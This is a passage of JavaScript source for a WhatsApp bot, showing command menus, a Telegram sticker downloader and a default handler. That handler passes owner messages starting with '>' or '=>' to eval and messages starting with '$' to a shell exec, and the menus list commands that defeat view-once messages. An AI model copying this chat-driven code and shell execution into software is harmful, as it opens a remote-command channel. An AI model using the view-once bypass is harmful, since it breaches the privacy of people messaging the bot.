╰━━━━━━━━━━━━━━━━━━╯`
    PhistarBotInc.sendMessage(m.chat, { text: groupMenu }, { quoted: m });
    break;

case 'ownermenu':
case '.ownermenu':
    let ownerMenu = `
╭⭑━━━➤ ᴏᴡɴᴇʀ ᴍᴇɴᴜ  
┣ ◁️⚡💥 𝐣𝐨𝐢𝐧  
┣ ◁️⚡💥 𝐬𝐡𝐮𝐭𝐝𝐨𝐰𝐧  
┣ ◁️⚡💥 𝐫𝐞𝐬𝐭𝐚𝐫𝐭
┣ ◁️⚡💥 𝐚𝐮𝐭𝐨𝐬𝐰𝐯𝐢𝐞𝐰 [𝐨𝐧/𝐨𝐟𝐟]  
┣ ◁️⚡💥 𝐛𝐥𝐨𝐜𝐤  
┣ ◁️⚡💥 𝐮𝐧𝐛𝐥𝐨𝐜𝐤  
┣ ◁️⚡💥 𝐛𝐚𝐧
┣ ◁️⚡💥 𝐮𝐧𝐛𝐚𝐧 
┣ ◁️⚡💥 𝐚𝐮𝐭𝐨𝐫𝐞𝐚𝐜𝐭 [𝐨𝐧/𝐨𝐟𝐟]
╰━━━━━━━━━━━━━━━━━━╯`
    PhistarBotInc.sendMessage(m.chat, { text: ownerMenu }, { quoted: m });
    break;

case 'convertmenu':
case '.convertmenu':
    let convertMenu = `
╭⭑━━━➤ ᴄᴏɴᴠᴇʀᴛ ᴍᴇɴᴜ  
┣ ◁️⚡💥 𝐬𝐭𝐢𝐜𝐤𝐞𝐫  
┣ ◁️⚡💥 𝐬𝐦𝐞𝐦𝐞  
┣ ◁️⚡💥 𝐭𝐚𝐤𝐞  
┣ ◁️⚡💥 𝐭𝐨𝐢𝐦𝐚𝐠𝐞  
┣ ◁️⚡💥 𝐭𝐨𝐯𝐢𝐝𝐞𝐨  
┣ ◁️⚡💥 𝐭𝐨𝐚𝐮𝐝𝐢𝐨  
┣ ◁️⚡💥 𝐭𝐨𝐦𝐩𝟑  
┣ ◁️⚡💥 𝐭𝐨𝐯𝐧  
┣ ◁️⚡💥 𝐭𝐨𝐠𝐢𝐟  
┣ ◁️⚡💥 𝐭𝐨𝐪𝐫  
┣ ◁️⚡💥 𝐭𝐨𝐯𝐢𝐞𝐰𝐨𝐧𝐜𝐞  
┣ ◁️⚡💥 𝐟𝐥𝐢𝐩𝐭𝐞𝐱𝐭  
┣ ◁️⚡💥 𝐞𝐦𝐨𝐣𝐢𝐦𝐢𝐱  
┣ ◁️⚡💥 𝐭𝐞𝐱𝐭𝟐𝐬𝐩𝐞𝐞𝐜𝐡  
┣ ◁️⚡💥 𝐭𝐞𝐱𝐭𝟐𝐩𝐝𝐟  
┣ ◁️⚡💥 𝐫𝐞𝐚𝐝𝐯𝐢𝐞𝐰𝐨𝐧𝐜𝐞𝟐  
┣ ◁️⚡💥 𝐯𝐯  
┣ ◁️⚡💥 𝐯𝐯𝟐  
╰━━━━━━━━━━━━━━━━━━╯`
    PhistarBotInc.sendMessage(m.chat, { text: convertMenu }, { quoted: m });
    break;

case 'databasemenu':
case '.databasemenu':
    let databaseMenu = `
╭⭑━━━➤ ᴅᴀᴛᴀʙᴀsᴇ ᴍᴇɴᴜ
┣ ◁️⚡💥 𝐚𝐝𝐝𝐯𝐢𝐝𝐞𝐨
┣ ◁️⚡💥 𝐚𝐝𝐝𝐢𝐦𝐚𝐠𝐞
┣ ◁️⚡💥 𝐚𝐝𝐝𝐬𝐭𝐢𝐜𝐤𝐞𝐫
┣ ◁️⚡💥 𝐚𝐝𝐝𝐯𝐧
┣ ◁️⚡💥 𝐚𝐝𝐝𝐳𝐢𝐩
┣ ◁️⚡💥 𝐚𝐝𝐝𝐚𝐩𝐤
┣ ◁️⚡💥 𝐚𝐝𝐝𝐩𝐝𝐟
┣ ◁️⚡💥 𝐝𝐞𝐥𝐯𝐢𝐝𝐞𝐨
┣ ◁️⚡💥 𝐝𝐞𝐥𝐢𝐦𝐚𝐠𝐞
┣ ◁️⚡💥 𝐝𝐞𝐥𝐬𝐭𝐢𝐜𝐤𝐞𝐫
┣ ◁️⚡💥 𝐝𝐞𝐥𝐯𝐧
┣ ◁️⚡💥 𝐝𝐞𝐥𝐳𝐢𝐩
┣ ◁️⚡💥 𝐝𝐞𝐥𝐚𝐩𝐤
┣ ◁️⚡💥 𝐝𝐞𝐥𝐩𝐝𝐟
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐯𝐢𝐝𝐞𝐨
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐢𝐦𝐚𝐠𝐞
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐬𝐭𝐢𝐜𝐤𝐞𝐫
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐯𝐧
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐳𝐢𝐩
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐚𝐩𝐤
┣ ◁️⚡💥 𝐥𝐢𝐬𝐭𝐩𝐝𝐟
╰━━━━━━━━━━━━━━━━━━╯`
    PhistarBotInc.sendMessage(m.chat, { text: databaseMenu }, { quoted: m });
    break;

                case 'telestick': {
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let xeonresources = await Telesticker(args[0])
		await replyphistar(`Sending ${xeonresources.length} stickers...`)
		if (m.isGroup && xeonresources.length > 30) {
			await replyphistar('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < xeonresources.length; i++) {
				PhistarBotInc.sendMessage(m.sender, { sticker: { url: xeonresources[i].url }})
			}
		} else {
			for (let i = 0; i < xeonresources.length; i++) {
				PhistarBotInc.sendMessage(m.chat, { sticker: { url: xeonresources[i].url }})
			}
		}
	} else replyphistar(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return replyphistar(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replyphistar(bang)
                    }
                    try {
                        replyphistar(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replyphistar(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return replyphistar(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replyphistar(evaled)
                    } catch (err) {
                        await replyphistar(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return replyphistar(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replyphistar(err)
                        if (stdout) return replyphistar(stdout)
                    })
                }
        }
    } catch (err) {
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})
